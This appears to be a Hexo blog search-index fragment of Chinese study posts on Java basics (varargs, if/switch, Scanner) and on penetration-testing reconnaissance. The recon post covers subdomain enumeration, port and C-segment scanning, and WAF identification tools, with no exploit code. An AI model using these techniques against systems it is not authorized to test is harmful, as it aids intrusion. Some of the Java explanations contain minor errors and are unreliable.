title="在命令行执行java程序"></a>在命令行执行java程序</h2><ol><li><p>首先需要将java程序编译为.class文件  使用命令为  javac   + 文件名</p><p><img src="java%E5%9F%BA%E7%A1%80-%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210727013353172.png" alt="image-20210727013353172"></p></li><li><p>执行程序需要回退到src文件夹下，使用 javac + 文件包名+文件名  执行程序</p><p><img src="java%E5%9F%BA%E7%A1%80-%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210727013641568.png" alt="image-20210727013641568"></p></li></ol><p>成功执行语句</p><h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><ol><li><p>java支持传递同类型的可变参数给一个方法</p></li><li><p><font color="red"> 在方法声明中，在指定参数类型后加一个省略号(…）</font></p></li><li><p>一个方法只能够声明一个可变参数，他必须是方法的最后一个参数，在任何普通参数之后声明</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mains</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">          mains Mains = <span class="keyword">new</span> mains();</span><br><span class="line">          Mains.test(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//可变参数类型</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span>... i)</span></span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j : i) &#123;</span><br><span class="line">                <span class="comment">//遍历输入的所有的参数</span></span><br><span class="line">                System.out.println(<span class="string">&quot;q的参数是:&quot;</span> + j);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">                            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当输入不同类型的参数时，字符串类型的参数会被转化为ascii码进行显示！</p><p><img src="java%E5%9F%BA%E7%A1%80-%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20210727015022951.png" alt="image-20210727015022951"></p><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><p>递归就是A方法自己调用自己，递归需要有退出条件，否则将无限循环</p><p>递归包含了两个部分:</p><ol><li><p>递归头:什么时候不在调用自身方法，如果没有头，将陷入死循环</p></li><li><p>递归体：什么时候需要调用自身方法</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集笔记</title>
      <link href="/posts/3619/"/>
      <url>/posts/3619/</url>
      
        <content type="html"><![CDATA[<h1 id="域名信息挖掘"><a href="#域名信息挖掘" class="headerlink" title="域名信息挖掘"></a>域名信息挖掘</h1><p>域名信息挖掘工作是渗透测试过程中信息收集阶段必不可少的一个环节，域名收集的多少代表了你能够测试站点的风险点有多少，通过在网站搭建过程中大家常用的习惯，我们将域名收集的工作划分为以下几个方向进行收集：</p><h2 id="目录型站点"><a href="#目录型站点" class="headerlink" title="目录型站点"></a>目录型站点</h2><p>目录型站点指的是相同域名，但是不同的目录下却存在不同的环境搭建的站点，简单来说  当<a href="http://www.a.com/a%E6%98%AF%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E6%B8%97%E9%80%8F%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%8C%E9%82%A3%E4%B9%88www.a.com/b%E6%98%AF">www.a.com/a是我们需要渗透的站点，那么www.a.com/b是</a> <a href="http://www.a.com/a">www.a.com/a</a> 同级目录下的站点，那么b对于a来说就是一个全新的站点，我们就可以说b是a的目录型站点,</p><p><a href="http://www.a.com/a">www.a.com/a</a></p><p><a href="http://www.a.com/b">www.a.com/b</a></p><h3 id="挖掘方式"><a href="#挖掘方式" class="headerlink" title="挖掘方式:"></a>挖掘方式:</h3><p>针对目录型站点一般是通过目录爆破，FUZZ等方式获取。</p><h2 id="端口型站点"><a href="#端口型站点" class="headerlink" title="端口型站点"></a>端口型站点</h2><p>端口型站点是同一网站不同的端口可能存在不同的站点，例如  <a href="http://127.0.0.1:80端口存在一个网站，通过扫描我们发现了http://127.0.0.1:8080端口也存在了一个站点，这在渗透过程中时非常常见的，即同域名不同端口的站点">http://127.0.0.1:80端口存在一个网站，通过扫描我们发现了http://127.0.0.1:8080端口也存在了一个站点，这在渗透过程中时非常常见的，即同域名不同端口的站点</a> 我们称为端口型站点，表现形式如下：</p><p><a href="http://127.0.0.1/">http://127.0.0.1</a>:<font color=red>80</font></p><p><a href="http://127.0.0.1/">http://127.0.0.1</a>:<font color=red>8080</font></p><h3 id="挖掘方式："><a href="#挖掘方式：" class="headerlink" title="挖掘方式："></a>挖掘方式：</h3><p>端口型站点在信息收集阶段可以通过nmap，御剑扫描等工具对所有端口进行扫描后，尝试访问所有开放的端口，获取开放端口所存在的web业务信息！</p><h2 id="子域名站点"><a href="#子域名站点" class="headerlink" title="子域名站点"></a>子域名站点</h2><p>子域名站点是针对主域名下的子域名进行收集的一种行为，在企业中为了方便管理以及识别，例如学校在架设其他业务时会采取子域名的形式进行绑定，例如 主域名为<a href="http://www.baidu.com,那么www1.baidu.com以及ab.www.baidu.com都可以认为是baidu.com的子域名,这些子域名可能与渗透目标之间存在一定的联系,这时我们就可以以子域名为突破口,最终对目标资产进行渗透./">www.baidu.com，那么www1.baidu.com以及ab.www.baidu.com都可以认为是baidu.com的子域名,这些子域名可能与渗透目标之间存在一定的联系，这时我们就可以以子域名为突破口，最终对目标资产进行渗透。</a></p><h3 id="挖掘方式-1"><a href="#挖掘方式-1" class="headerlink" title="挖掘方式"></a>挖掘方式</h3><p>子域名挖掘一般可以通过工具或者google语法，爆破等方式进行收集</p><h4 id="子域名收集工具"><a href="#子域名收集工具" class="headerlink" title="子域名收集工具"></a>子域名收集工具</h4><p>1.subDomainBrute</p><p>Github:<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p>2.OneForAll</p><p>github: <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p>3.subfinder</p><p><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>4.findomain</p><p>5.子域名挖掘机等</p><p>以上工具都可以实现对子域名进行挖掘的工作</p><h2 id="类似域名站点"><a href="#类似域名站点" class="headerlink" title="类似域名站点"></a>类似域名站点</h2><p>类似域名站点收集的思路是运维人员为了方便管理，之前的域名被弃用或者更换新的顶级域名等，通过该方式我们可以收集到之前使用过的一些域名，但是并没有关站，这种网站一般来说缺乏管理维护，出现问题的可能性也相对较大</p><p>表现形式如下：</p><p><a href="http://www.baidu.com/">www.baidu.com</a></p><p><a href="http://www.baidu.cn/">www.baidu.cn</a></p><p><a href="http://www.baidu1.com/">www.baidu1.com</a></p><p>等表现形式都可能与目标站点有关，这种收集方式在src挖掘中有很大作用</p><h2 id="旁注，C段站点"><a href="#旁注，C段站点" class="headerlink" title="旁注，C段站点"></a>旁注，C段站点</h2><p>旁注指的是相同IP地址但是缺綁定了許多的域名的情況，在学校站点中一般情况下一个网络出口绑定了若干的域名，在内部进行流量转发后进入不同的服务器，但是对于外部来说，我们访问的都是同一个IP地址，这时我们可以通过IP反查的方式来获取IP地址绑定的所有域名，进行域名信息收集工作。</p><p>C段站点</p><p>收集思路为：当运维人员需要较多IP地址时，一般情况下会选择相邻的IP地址进行购买和管理，那么我们可以通过对C段所有的IP地址进行枚举和爆破，有可能会获取到意想不到的资产信息！</p><h1 id="WAF防护"><a href="#WAF防护" class="headerlink" title="WAF防护"></a>WAF防护</h1><h2 id="WAF是什么"><a href="#WAF是什么" class="headerlink" title="WAF是什么"></a>WAF是什么</h2><p>Web应用防护系统（也称为：<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用<a href="https://baike.baidu.com/item/%E5%9B%BD%E9%99%85/766689">国际</a>上公认的一种说法：Web应用<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>是通过执行一系列针对HTTP/HTTPS的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/2890163">安全策略</a>来专门为<a href="https://baike.baidu.com/item/Web/150564">Web</a>应用提供保护的一款产品。</p><h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><h3 id="1-脚本工具识别"><a href="#1-脚本工具识别" class="headerlink" title="1.脚本工具识别"></a>1.脚本工具识别</h3><p>（1） wafw00f</p><p>   github 地址：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>（2）Awesome-WAF</p><p>   github 地址<a href="https://github.com/0xInfection/Awesome-WAF">https://github.com/0xInfection/Awesome-WAF</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础-选择结构</title>
      <link href="/posts/54235/"/>
      <url>/posts/54235/</url>
      
        <content type="html"><![CDATA[<h1 id="IF选择结构"><a href="#IF选择结构" class="headerlink" title="IF选择结构"></a>IF选择结构</h1><p>if选择结构是java最基础的选择结构之一，IF语句共分为IF单选择语句，IF双选择语句以及IF多选择结构</p><h2 id="IF单选择语句"><a href="#IF单选择语句" class="headerlink" title="IF单选择语句"></a>IF单选择语句</h2><p>表达式语法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(布尔表达式）&#123;</span><br><span class="line"></span><br><span class="line">语句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">当布尔表达式为真时，执行结构体中的语句，为假时则直接跳过！</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String s = scanner.nextLine();</span><br><span class="line">        <span class="comment">//判斷s的值和hello是否相等，相等時執行hello world ，不相等時則直接執行end</span></span><br><span class="line">        <span class="keyword">if</span> ( s.equals(<span class="string">&quot;hello&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;End &quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IF双选择语句"><a href="#IF双选择语句" class="headerlink" title="IF双选择语句"></a>IF双选择语句</h2><p>表达式语法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(布尔表达式）&#123;</span><br><span class="line"></span><br><span class="line">IF语句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">else语句</span><br><span class="line"></span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">当布尔表达式成立时执行IF语句的内容，如果不成立时执行else语句的内容</span><br></pre></td></tr></table></figure><h2 id="IF多选择语句"><a href="#IF多选择语句" class="headerlink" title="IF多选择语句"></a>IF多选择语句</h2><p>表达式语法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(布尔表达式1)｛</span><br><span class="line">if语句</span><br><span class="line"></span><br><span class="line">｝else if(布尔表达式2)&#123;</span><br><span class="line">elseif语句内容</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">else语句内容</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">表达式1成立时执行IF语句内容，表达式2成立时执行elseif语句内容，都不成立时执行else语句内容！</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner((System.in));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入成绩&quot;</span>);</span><br><span class="line">        <span class="comment">//判断输入是否为整数</span></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNextInt())&#123;</span><br><span class="line">            <span class="keyword">int</span> num = scanner.nextInt();</span><br><span class="line">            <span class="comment">//输入错误直接程序退出</span></span><br><span class="line">            <span class="keyword">if</span> (num&lt;<span class="number">0</span> | num &gt;<span class="number">100</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;输入成绩错误，程序已退出&quot;</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断成绩进入不同的语句</span></span><br><span class="line">            <span class="keyword">if</span>(num == <span class="number">100</span>)&#123;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;恭喜你，你的成绩是满分&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num &gt;=<span class="number">80</span> &amp; num &lt; <span class="number">100</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;恭喜你，你的成绩是优秀&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num &gt;=<span class="number">60</span> &amp; num &lt;<span class="number">80</span>)&#123;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;恭喜你，你的成绩是良好&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不好意思，怒的成绩不及格&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入整数，Enter键结束输入！&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="switch多选择结构"><a href="#switch多选择结构" class="headerlink" title="switch多选择结构"></a>switch多选择结构</h1><p>switch结构是一个多选择的结构，通过满足不同的case条件，匹配后进入到case条件所在的语句中进行执行命令</p><p><img src="image-20210708153742402.png" alt="image-20210708153742402"></p><p>实例：</p><p>通过c的值进入不同case中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SwitchDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String c = <span class="string">&quot;A&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;A&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;C&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;D&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;未知&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="case穿透"><a href="#case穿透" class="headerlink" title="case穿透"></a>case穿透</h2><p>在上面的实例中我们在每个case中都添加了一个break语句，那么不添加时我们的switch语句就会执行匹配语句后的所有的语句</p><p><img src="image-20210708154706412.png" alt="image-20210708154706412"></p><p>从例子中可以看到执行了B匹配的case下的所有的语句，这在实际中是不正常的，所以我们在没有特殊需求时需要在每个case后添加break语句。</p>]]></content>
      
      
      
        <tags>
            
            <tag> java基础 </tag>
            
            <tag> 选择结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习Scanner对象</title>
      <link href="/posts/62393/"/>
      <url>/posts/62393/</url>
      
        <content type="html"><![CDATA[<h1 id="Scanner对象"><a href="#Scanner对象" class="headerlink" title="Scanner对象"></a>Scanner对象</h1><p>Scanner类可以用来获取用户的输入信息，控制用户的交互内容。</p><p>首先创建一个Scanner对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scanner scanner = <span class="keyword">new</span> Scanner(System.in)</span><br></pre></td></tr></table></figure><p>这样我们就可以使用scanner对象获取用户输入了</p><h1 id="hasnext以及hasNextLine"><a href="#hasnext以及hasNextLine" class="headerlink" title="hasnext以及hasNextLine"></a>hasnext以及hasNextLine</h1><h2 id="两种方法的差异"><a href="#两种方法的差异" class="headerlink" title="两种方法的差异"></a>两种方法的差异</h2><p>hasnext以及hasnextline 方法都是获取是否还有输入的方法，但是两者也有一些区别</p><p>next方法：</p><p>​    1.一定要读取到有效字符后才可以结束输入</p><p>​    2.遇到空格时，之后输入的内容会自动去掉</p><p>​    3.只有输入有效内容后后面的空格才会被当做分隔符或结束符号</p><p>​    4.NEXT()不能得到带有空格的字符串</p><p>总结来说 next方法当遇到空格时就没得办法了，但是在实际的字符串中空格却很常见，例如外国人的名字等，所以实用性不大，那么nextline方法就能够有效解决该问题</p><p>nextline方法：</p><p>1.以Enter为结束符，接受回车之前所有的字符</p><p>2.可以获取空白内容</p><p>简单来说nextline是next的加强版本,推荐使用</p><h1 id="简单小实例1"><a href="#简单小实例1" class="headerlink" title="简单小实例1"></a>简单小实例1</h1><p>下面实例为scanner的常见用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">scannerline</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用nextline方式接收数据:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNextLine())&#123;</span><br><span class="line"></span><br><span class="line">            String s = scanner.nextLine();</span><br><span class="line">            System.out.println(s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实例2（进阶）"><a href="#实例2（进阶）" class="headerlink" title="实例2（进阶）"></a>实例2（进阶）</h1><p>实验要求：输入多个数字，求其总和以及平均数，每输入一个数字用回车确认，通过非数字结束输入并输入执行结果</p><p>实验分析：回车确认我们只能使用nextline方法获取数据，非数字输入我们可以使用hasNextInt获取是否是数字，用循环来判断输入次数。开整</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Scannerline</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用nextline方式接收数据:&quot;</span>);</span><br><span class="line">        <span class="comment">//创建总和变量</span></span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="comment">//创建输入数字个数变量</span></span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//创建平均数变量</span></span><br><span class="line">        <span class="keyword">double</span> avg = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextDouble())&#123;</span><br><span class="line">            <span class="keyword">double</span> i =  scanner.nextDouble();</span><br><span class="line">            sum += i;</span><br><span class="line">            num = num+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算平均数</span></span><br><span class="line">        avg = sum / num;</span><br><span class="line">        System.out.println(<span class="string">&quot;您输入了个数字&quot;</span>+ num);</span><br><span class="line">        System.out.println(<span class="string">&quot;您输入数字总和为&quot;</span>+sum);</span><br><span class="line">        System.out.println(num+<span class="string">&quot;个数字的平均数&quot;</span>+avg);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Scanner是java 接收用户输入的必备方法，后期用到的地方会非常多，同时scanner对象有许多自带的方法可以使用。后期学习后补充！</p>]]></content>
      
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
